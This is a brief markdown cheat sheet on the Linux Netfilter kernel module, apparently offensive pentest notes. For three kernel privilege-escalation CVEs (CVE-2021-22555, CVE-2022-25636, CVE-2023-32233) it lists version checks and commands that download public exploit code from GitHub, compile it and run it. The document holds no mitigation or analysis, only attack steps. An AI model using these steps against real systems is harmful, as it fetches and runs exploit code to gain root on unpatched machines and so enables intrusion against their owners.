# Netfilter

This kernel module has three main functions:

Packet defragmentation
Connection tracking
Network address translation (NAT)

## CVE-2021-22555

uname -r

5.10.5-051005-generic

wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit

## CVE-2022-25636

uname -r

5.13.0-051300-generic

git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit

## CVE-2023-32233

git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl

./exploit

